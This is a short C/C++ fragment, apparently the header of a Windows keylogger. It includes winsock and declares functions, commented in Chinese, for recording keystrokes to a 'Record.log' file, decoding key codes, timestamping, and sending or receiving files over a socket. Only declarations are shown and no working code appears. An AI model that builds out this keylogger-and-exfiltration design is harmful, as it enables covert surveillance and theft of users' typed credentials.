//service
#include<stdio.h> 
#include<winsock2.h>
#pragma comment(lib, "ws2_32.lib")

//keylog
#include <windows.h>
#include <time.h>
#include <iostream> 
#include <string>
#include <fstream>
#define FILE_NAME "Record.log"
#define MIN_RECORD_SIZE 25

//file
#include <stdlib.h> 
#include <string.h> 


void logKey();  //记录键盘 
char* decode(int); // 解密键码 
char* decodeCaps(int); //大写键码 
void logUserTime();  //时间戳 
bool checkRecordSize();  //检验文件的行数 
int KeyLog(); //键盘记录函数 

void sendFile(SOCKET m_New_Socket); //传送文件 
void recvFile(SOCKET m_New_Socket);  //接受文件
void File(SOCKET m_New_Socket);//传输文件主函数 

